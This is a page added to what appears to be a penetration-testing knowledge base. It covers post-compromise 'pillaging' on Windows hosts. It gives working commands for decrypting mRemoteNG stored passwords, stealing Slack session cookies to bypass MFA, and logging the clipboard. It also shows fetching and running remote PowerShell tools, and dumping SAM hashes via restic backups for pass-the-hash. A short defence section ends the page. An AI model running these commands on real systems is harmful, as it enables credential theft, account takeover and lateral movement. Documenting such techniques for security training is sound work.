@@ -1,0 +1,140 @@
+---
+title: Pillaging
+description: Post-foothold data gathering on a compromised Windows host - enumerating installed applications, looting remote-management configs (mRemoteNG confCons.xml and its hardcoded master password), stealing IM-client session cookies from Firefox and Chromium to ride a user's Slack/Teams session past MFA, logging the clipboard for pasted secrets, and abusing a backup system (restic) to snapshot and restore the SAM/SYSTEM hives for offline hash extraction and pass-the-hash.
+mitre: [T1005, T1539, T1552.001, T1003.002]
+d3fend: [D3-FA, D3-CH]
+impact: [CredentialTheft, PrivEsc]
+owasp: []
+noise: moderate
+sidebar:
+  order: 22
+  label: Pillaging
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Pillaging is the post-foothold hunt for anything that extends access - credentials, session tokens, infrastructure detail, sensitive data. Distinct from the targeted [credential hunting](/codex/windows/privesc/credential-hunting/) sweeps, this is about *applications and their stored state*: management tools, browsers, IM clients, the clipboard, and backup systems.
+
+```powershell
+# What's installed? (apps are the map to where the loot is)
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  Select DisplayName,DisplayVersion,InstallLocation
+
+# Loot management-tool configs (mRemoteNG stores creds under a hardcoded master pw)
+gc $env:APPDATA\mRemoteNG\confCons.xml           # → mRemoteNG-Decrypt
+
+# Steal an IM session cookie to ride the session past MFA
+Invoke-SharpChromium -Command "cookies slack.com"   # Chromium (DPAPI); Firefox: cookies.sqlite
+
+# Watch the clipboard (password-manager paste → cleartext)
+Invoke-ClipboardLogger
+```
+
+Success indicator: recovered credentials, a usable session cookie that logs you into the user's cloud IM, or - via a backup system - the SAM/SYSTEM hives yielding local hashes for reuse.
+
+## Installed applications
+
+Installed software is the map to where loot lives. List it fast with the Program Files directories, or more thoroughly from the uninstall registry keys:
+
+```powershell
+dir "C:\Program Files", "C:\Program Files (x86)"
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
+                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  ? DisplayName | sort DisplayName -Unique | ft DisplayName,DisplayVersion,InstallLocation
+```
+
+Flag remote-management tools (mRemoteNG, TeamViewer, PuTTY), IM clients, browsers, backup agents, and dev tooling - each is a store to loot below. (This is the same uninstall-key enumeration [stored credentials](/codex/windows/privesc/stored-credentials/) uses; run it once and reuse the list.)
+
+## Management-tool configs - mRemoteNG
+
+[mRemoteNG](https://mremoteng.org/) saves connection credentials to `confCons.xml` in `%APPDATA%\mRemoteNG`. If the user didn't set a custom master password, it encrypts with a **hardcoded default (`mR3m`)** - so the stored passwords are trivially recoverable:
+
+```xml
+<Node Name="RDP_Domain" Username="administrator" Domain="test.local" Hostname="10.0.0.10"
+      Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+..." Protocol="RDP"/>
+```
+
+Copy the `Password` value and decrypt with [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt):
+
+```shell
+python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzU..."            # default master pw
+python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHush..." -p admin            # custom master pw, if known
+```
+
+If a custom master password is set, decryption fails with `MAC check failed`; crack it by looping a wordlist through the script against the `Password` (or the file's `Protected` attribute) until one returns the plaintext. The same pattern applies to other management tools that store "encrypted" connection secrets with recoverable keys.
+
+## IM-client session cookies (Slack / Teams)
+
+If a user is signed into Slack or Teams and you can't get (or MFA blocks) their password, steal their **session cookie** and replay it to log in as them in a browser. Slack's auth token lives in the cookie named **`d`**.
+
+**Firefox** stores cookies in a per-profile SQLite DB; copy it and extract:
+
+```powershell
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+```shell
+python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
+```
+
+**Chromium** encrypts the cookie value with DPAPI, so decrypt it *in the user's session* with [SharpChromium](https://github.com/djhohnstein/SharpChromium) / `Invoke-SharpChromium`:
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+# modern Chrome moved the DB - copy it to where the tool expects, then:
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+Invoke-SharpChromium -Command "cookies slack.com"
+```
+
+Load the recovered `d` value into a browser with the **Cookie-Editor** extension, point it at `slack.com`, refresh, and you're in the user's workspace - search chats for passwords/PII. Replay the same cookie on any sub-prompt.
+
+<Aside type="caution">
+The Chromium DPAPI path works on legacy/older profiles, but **Chrome 127+ App-Bound Encryption** blocks same-user DPAPI decryption of the cookie store - as covered on [stored credentials](/codex/windows/privesc/stored-credentials/#saved-browser-logins), a current Chrome profile needs ABE-aware tooling or in-browser extraction instead. Firefox (no ABE) remains straightforward.
+</Aside>
+
+## Clipboard
+
+Admins using a password manager *paste* credentials rather than type them, so keylogging misses them but the **clipboard** catches them - along with 2FA soft-tokens and RDP-clipboard content. Log it with [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard):
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+Invoke-ClipboardLogger        # prints clipboard entries as they change - wait for a paste
+```
+
+## Backup systems
+
+Backup servers and agents are crown jewels: the backup account usually has **local admin on every protected host**, and the backups themselves contain those hosts' sensitive files - including registry hives. If you land on one, loot the backups.
+
+Using [restic](https://restic.net/) as the example (many enterprise systems follow the same shape), you can snapshot protected data - `--use-fs-snapshot` takes a VSS copy so even locked files like the registry hives are captured - then restore it and extract hashes offline:
+
+```powershell
+$env:RESTIC_PASSWORD = 'Password'                 # or find it unset/stored nearby
+restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
+restic.exe -r E:\restic2\ snapshots                # list; pick the config snapshot ID
+restic -r E:\restic2 restore <snapID> --target C:\RESTORE
+```
+
+From the restored `SAM`/`SYSTEM` (under `C:\RESTORE\...\Windows\System32\config`), extract local hashes with impacket and reuse them - this is the same hive-to-hashes flow as [Backup Operators](/codex/windows/privesc/backup-operators/):
+
+```shell
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+# Administrator:500:aad3b435...:bac9dc5b7b4bec1d83e0e9c04b477f26:::
+psexec.py Administrator@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26
+# or: netexec smb TARGET -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26
+```
+
+The recovered NT hash **is** pass-the-hash-able (unlike the NetNTLMv2 from [forced-auth capture](/codex/windows/privesc/capturing-user-credentials/)), and a local-admin hash often works across hosts that share it.
+
+## Defense
+
+- Set a strong, non-default master password on mRemoteNG and similar tools - the hardcoded `mR3m` makes "protected" configs plaintext. Better, don't store privileged creds in connection managers at all.
+- Protect browser cookie stores (Chrome App-Bound Encryption), and treat session-cookie theft as credential theft: short session lifetimes and re-auth on sensitive actions blunt cookie replay even with MFA.
+- Harden backup infrastructure as tier-0: dedicated, least-privilege backup accounts (not domain/local admin everywhere), encrypted repositories with protected passwords, and tight ACLs on repos and snapshots.
+- Monitor for clipboard-logger and cookie-extraction tooling, bulk reads of browser profile/`AppData` paths, and unexpected `restic`/backup-tool invocations.
+
+## Related
+
+- [Capturing credentials from other users](/codex/windows/privesc/capturing-user-credentials/) - the active/baiting counterpart to this passive looting
+- [Stored credentials](/codex/windows/privesc/stored-credentials/) - browser logins, Credential Manager, and the App-Bound Encryption caveat
+- [Backup Operators](/codex/windows/privesc/backup-operators/) - the SAM/SYSTEM-hive-to-hashes flow the restored backups feed
+- [Credential hunting](/codex/windows/privesc/credential-hunting/) - targeted file-at-rest sweeps that complement application looting
